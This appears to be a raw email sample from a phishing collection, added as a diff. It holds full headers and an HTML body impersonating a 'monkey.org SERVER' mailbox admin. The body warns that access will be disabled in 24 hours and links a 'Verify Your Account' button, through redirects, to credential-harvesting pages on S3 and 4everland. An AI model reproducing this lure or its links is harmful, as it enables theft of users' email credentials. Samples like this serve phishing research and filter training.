@@ -1,0 +1,155 @@
+Return-Path: info@gnfc-in.com
+Delivered-To: jose@monkey.org
+X-FDA: 83823047028.10.E3C3AA4
+Received: from gnfc-in.com (gnfc-in.com [185.81.114.111])
+	by imf02.b.hostedemail.com (Postfix) with ESMTP id 242E61A0004
+	for <jose@monkey.org>; Wed, 27 Aug 2025 16:19:11 +0000 (UTC)
+Authentication-Results: imf02.b.hostedemail.com;
+	dkim=pass header.d=gnfc-in.com header.s=dkim header.b="kwXrv1I/";
+	spf=pass (imf02.b.hostedemail.com: domain of info@gnfc-in.com designates
+ 185.81.114.111 as permitted sender) smtp.mailfrom=info@gnfc-in.com;
+	dmarc=pass (policy=reject) header.from=gnfc-in.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1756311552;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=CXfycuW+Kurw/b9e07j+Pz+E+5b3EhhnVJ+lAh8F9/Q=;
+	b=QpH5iWbN/OnXfI/hqCWGBbVtAjrCBloGgjsmu2leK1CKzgKipYq4Y1NwJoxd8plGM7CDrN
+	iiMWIkbe4kEEpMAWzvHygM7kssNYsc50xXp0j25qaRw4Lbc0cU/paXXRCI1YGh9LIBUxW2
+	B1slDspBRb8UVZfQQdjQ6fbnA/b8EWo=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1756311552; a=rsa-sha256;
+	cv=none;
+	b=DS/yhZG7y4NVRWVewmyRfypCkkJlOCCCfeg542PwfJmI+mqVdvtJerPUm54u0BUbP4WSlA
+	OUPNcIrBH11OY5LwgVS8COiAVRWi+QGPtIui5TyPTJcltGsbRvfr1KAnAn+eALKjUhUj0M
+	uXGPAkd50vCVdlWbLXLQcXf8S9GCJso=
+ARC-Authentication-Results: i=1;
+	imf02.b.hostedemail.com;
+	dkim=pass header.d=gnfc-in.com header.s=dkim header.b="kwXrv1I/";
+	spf=pass (imf02.b.hostedemail.com: domain of info@gnfc-in.com designates
+ 185.81.114.111 as permitted sender) smtp.mailfrom=info@gnfc-in.com;
+	dmarc=pass (policy=reject) header.from=gnfc-in.com
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=gnfc-in.com
+	; s=dkim; h=Content-Type:MIME-Version:Date:Content-Transfer-Encoding:
+	Message-ID:Subject:Cc:To:From:Sender:Reply-To:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=CXfycuW+Kurw/b9e07j+Pz+E+5b3EhhnVJ+lAh8F9/Q=; b=kwXrv1I/6HYY+ndkpzAZSziKVo
+	MfOztp0j3u2bpPsiPEV1afl3cfvlX8qO+mqN0AuRcxK0Hd6pX4x5odwjSP+J1Mb6rMUBzLDZPxksc
+	09T/uq5MBaOJWqUUgW0fFjheL+XWWfJrX9rfE+5zKuVbzE/LR7jeItiGNK5q3JNwti98=;
+Received: from [185.49.126.72] (helo=[127.0.0.1])
+	by gnfc-in.com with esmtpsa  (TLS1.3) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.93)
+	(envelope-from <info@gnfc-in.com>)
+	id 1urIre-000A8C-2G; Wed, 27 Aug 2025 16:19:10 +0000
+From: "monkey.org SERVER" <info@gnfc-in.com>
+To: jose@monkey.org
+Cc: IT@monkey.org, Monkey.org@monkey.org
+Subject: =?UTF-8?Q?Your_Email_Access_Needs_Verification_?=
+ =?UTF-8?Q?=E2=80=93_Please_Respond?=
+Message-ID: <1f4fc6ee-c2d4-2907-0bf0-f6436d8c8567@gnfc-in.com>
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 27 Aug 2025 16:19:09 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+X-SPF-Fail: YES
+X-Spam-Status: No, score=1.51
+X-Stat-Signature: gfbbpijk1a9ncty61goour88k5ipwtk4
+X-Rspam-User: 
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 242E61A0004
+X-HE-Tag: 1756311551-752997
+X-HE-Meta: 
+ U2FsdGVkX19QtjqdovXlXl11KT8p/W44wDse27OkV+z3qUoUwasG6u0I56vZUDTpSJbYRy9/nJpJ9loDY7ozdj7BZSYPiG0GmZqJw6cgkGTG6czPuIcfvKb88wc3QNequ3FUQcyt0FkODyvqfofNE3U34CalIIW+J2eyOv5pou1w7PSqPBZqcy4quUKNDxeD7XAqcwOzPsHaqfj0Af/aIYObH63jfkdvlCBt8akw362Ihsu40iGekKviLxW4Gwpv6KqfYNsmynHNFPY6nG5Lpk0UE38wEWrBwaMVLTMfrdbVVpEE5UdfTmxqXVy9Aga9Xz1PJ5kXKW5nDgwM0ORtQs6oNCsxcYGf/ITPBQcBVb9hsu8Rz4Uu9oMRirS5dxB6oHWKcVHLdtFweiM3r3BAKj0nrm6EgoL7ej3UCCWhNz6IVcdurgubSztlVbdTaglQGKFltE+85KDko91fMQ3U8nmd0cvWxtvmrPaECuPHVUaVTtM8xPl4c0i9tGdSQ3yvNk8xmdrU6of3PvO7UD4FpWXLrPf4s8m7zxe+dpfAUbSK7R+ksca/hK+6CN7nLsRpRFTE8UBnbVyF2MY5L9/s4hjQf3k6S7gKw5WJB7bA0PMce+8FUtZu7kgUn8nd0SRbTmURNMZfTVQwqdq6coxYEbWXF6ipxXQCfxOGU2213j++mqMVsb7iVDlI2tktOi/TYf+y6HWyNFdrT8eUClC7oHsQloDfV8Q6erWh6TeAmaFn7yDnKMpRSLExmylfMtOEiaHg/rxLS09qNJWxAO/PBubZ4Q1qDLrP6sq4A3rllDXo/DsL6R+7FP9HuHTlXLPudGfRWEHaGZzFx6a/D0h4BHDQ7+yNR9uYP/D0L73gtPWfTcGlfyw0nyjdddHEdPbOHvgnkPXbGx1Um/NgcmXHsz9xR034bRShSSD/IL07S3P2vsyHBLJwSoD2HtB0DKNhyr/B5XreiDeNMgFBHbJe3pBZa9W
+ RH3p/FuqBUL5TC2y590PvvbNpQ8mnZLMK2Wp2JJD63BN9iwFYEA8MOZTLr8m4ywpT9jnXOo4043R4vtXHR0zv8QfHh4pkaOn2r5Yn3rYGTwJEvQy3/UPkLEz1a7mWDRGFbu0r0q0ptOJ70VXjI4SIHPLoNMS1hP5OTwjCRPgcogECCdhm5ERdSMJN0UGsdCH/Ky9TH8pmIY8R442zUZ/C3z9lnG+ZfhCe3arj6byGxLGz6/sPXFQDbCOTc8tMKJeLU4ftVo1me386UyZmOPYMNA8hmEEMUyE2As4qhEXTxd3GWEBNslvWFp/8g16z6G/kPvJRIy4TTBe5o4k9mpfZlBeQtokzsmaAGkinJQCtGTKTIsKc1A2jf4cVJGy7ZEBYZ5ZfSXOOoO2eeFRssUx1cAR+KEP21DxNw+VUGpgT3N+4UAcgE3fSnFQNGQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 344
+
+<div id=3D":1i2" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" =
+hidefocus=3D"true" aria-label=3D"Message Body" writingsuggestions=3D"false"=
+ g_editable=3D"true" role=3D"textbox" aria-multiline=3D"true" =
+contenteditable=3D"true" style=3D"direction: ltr; min-height: 288px;" =
+tabindex=3D"1" spellcheck=3D"false" aria-owns=3D":1kg" =
+aria-controls=3D":1kg" aria-expanded=3D"false"><div dir=3D"ltr"><div =
+dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div style=3D"color:rgb(34,34=
+,34);font-family:&quot;Google Sans&quot;,Roboto,RobotoDraft,Helvetica,Arial=
+,sans-serif;font-size:medium;font-style:normal;font-variant-ligatures:norma=
+l;font-variant-caps:normal;font-weight:400;letter-spacing:normal;text-align=
+:start;text-indent:0px;text-transform:none;word-spacing:0px;white-space:nor=
+mal;background-color:rgb(255,255,255);text-decoration-style:initial;text-de=
+coration-color:initial"><div>&nbsp;</div><div id=3D"m_3134007419899544114m_=
+5221555943546008126m_2533141170540424532m_-6194375333378079298gmail-:2cq"><=
+/div><div id=3D"m_3134007419899544114m_5221555943546008126m_253314117054042=
+4532m_-6194375333378079298gmail-:2do" style=3D"direction:ltr;margin:8px 0px=
+ 0px;padding:0px;font-size:0.875rem;overflow-x:hidden"><div =
+id=3D"m_3134007419899544114m_5221555943546008126m_2533141170540424532m_-619=
+4375333378079298gmail-:2dp" style=3D"direction:ltr;font:small/1.5 Arial,=
+Helvetica,sans-serif;overflow:auto hidden"><div style=3D"margin:0.=
+5em"><table style=3D"margin:0px;border:1px dotted rgb(211,211,=
+211);width:598px;color:rgb(51,51,51);text-transform:none;letter-spacing:nor=
+mal;font-family:Verdana,Arial,Helvetica,sans-serif;font-size:12px;font-styl=
+e:normal;font-weight:400;word-spacing:0px;white-space:normal;border-collaps=
+e:collapse;max-width:1024px;background-color:rgb(255,255,=
+255);font-variant-ligatures:normal;font-variant-caps:normal;text-decoration=
+-style:initial;text-decoration-color:initial"><tbody><tr><td =
+style=3D"margin:0px;padding:24px;border-radius:3px;border:1px solid rgb(223=
+,225,230);outline-width:medium;outline-style:none"><h2 =
+style=3D"line-height:1.1;font-family:inherit;font-size:30px;margin-top:20px=
+;margin-bottom:10px"><span style=3D"text-align:center;color:rgb(30,144,=
+255);font-family:Arial,Helvetica,sans-serif;font-size:16px"><font =
+size=3D"5">Email Account&nbsp;Verification</font></span></h2><br><p =
+style=3D"margin:0px 0px 10px">Monkey.org</p><p style=3D"margin:0px 0px =
+10px"><br></p><p style=3D"margin:0px 0px 10px"><font face=3D"Georgia" =
+size=3D"2">We have detected that your device has sent a shutdown request to=
+ our internal server.</font></p><p style=3D"margin:0px 0px 10px"><font =
+face=3D"Georgia" size=3D"2">As a precaution your email access will be =
+disabled within 24 hours unless you verify your account.<font =
+face=3D"Georgia"><br></font></font></p><p style=3D"margin:0px 0px =
+10px"><br><br style=3D"color:rgb(33,33,33);text-transform:none;text-indent:=
+0px;letter-spacing:normal;font-family:Arial,sans-serif;font-size:15px;font-=
+style:normal;font-weight:400;word-spacing:0px;white-space:normal;background=
+-color:rgb(255,255,255);font-variant-ligatures:normal;font-variant-caps:nor=
+mal;text-decoration-style:initial;text-decoration-color:initial"><a =
+href=3D"https://www.google.com/url?q=3Dhttps%3A%2F%2Fs3.eu-north-1.=
+amazonaws.com%2Feu-north-1.console.aws.amazonwebmail%2FBlueajax.=
+html&amp;sa=3DD&amp;sntz=3D1&amp;usg=3DAOvVaw0eOp2ZphBC2x1u0uyP_d8D#jose@mo=
+nkey.org" rel=3D"nofollow" style=3D"color:rgb(75,93,=
+255);text-transform:none;text-indent:0px;letter-spacing:normal;font-family:=
+Arial,sans-serif;font-size:16px;font-style:normal;font-weight:400;text-deco=
+ration:none;word-spacing:0px;white-space:normal;background-color:rgb(255,=
+255,255);font-variant-ligatures:normal;font-variant-caps:normal" =
+target=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?=
+q=3Dhttps://www.google.com/url?q%3Dhttps%253A%252F%252Fcheckmate-mbsitjwi.=
+4everland.app%252F%26sa%3DD%26sntz%3D1%26usg%3DAOvVaw2MHtPTOWbP7u6Mj86BTXI0=
+%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1756388616866000&amp;us=
+g=3DAOvVaw3A0q18YrnYEnqFZgmYYlwM"><font style=3D"padding:10px =
+30px;color:rgb(255,255,255);font-family:&quot;new serif&quot;,emojifont,=
+serif,EmojiFont;background-color:rgb(0,120,215)">Verify Your =
+Account</font></a><br><br><br><font face=3D"Georgia" size=3D"2">If you =
+believe this is an error please complete the verification process using the=
+ URL&nbsp;Above to maintain uninterrupted access to your email.=
+</font><br><br><br>Thanks,<br>Mailbox Admin<br>monkey.org</p><hr =
+style=3D"margin-top:20px;margin-bottom:20px;border-top-color:rgb(238,238,=
+238);border-right-width:0px;border-bottom-width:0px;border-left-width:0px;b=
+order-top-style:solid;min-height:0px"><font face=3D"georgia, serif"><span =
+style=3D"color:rgb(110,120,139)">This email was sent&nbsp;to</span><span =
+style=3D"color:rgb(61,133,198)">&nbsp;</span></font>&nbsp;jose@monkey.=
+org<br><font face=3D"georgia, serif"><span style=3D"font-size:9px"><i><font=
+ size=3D"1">&nbsp;<span zeum4c5=3D"PR_2_0" data-ddnwab=3D"PR_2_0" =
+aria-invalid=3D"spelling" class=3D"LI ng">Copyrigt</span></font>&nbsp;</i><=
+font size=3D"+0">@ 2025&nbsp;<a style=3D"color:rgb(17,85,204)"> monkey.=
+org</a>&nbsp;</font><i><font size=3D"1">All rights reserved</font>.=
+</i></span>&nbsp;</font></td></tr></tbody></table></div></div></div></div>
+
+<br></div>
+</div>
+</div>
+</div>
+</div>
+
